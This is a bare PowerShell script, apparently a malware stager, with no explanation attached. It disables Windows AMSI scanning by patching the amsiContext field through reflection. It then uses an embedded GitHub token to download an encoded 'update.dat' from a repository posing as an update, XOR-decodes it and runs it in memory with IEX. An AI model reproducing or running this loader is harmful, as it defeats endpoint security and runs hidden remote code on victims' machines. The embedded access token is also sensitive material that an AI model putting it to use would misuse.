try{$t=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$b=[Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static;$f=$t.GetField("amsiContext",$b);$p=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($p,0)}catch{}
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$h=@{Authorization='token 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';Accept='application/vnd.github.v3.raw'}
$b64=(Invoke-RestMethod -Uri 'https://api.github.com/repos/Tokenairdrop527/update/contents/update.dat' -Headers $h)
$bytes=[Convert]::FromBase64String($b64)
IEX([Text.Encoding]::UTF8.GetString(($bytes|%{$_-bxor0xAE})))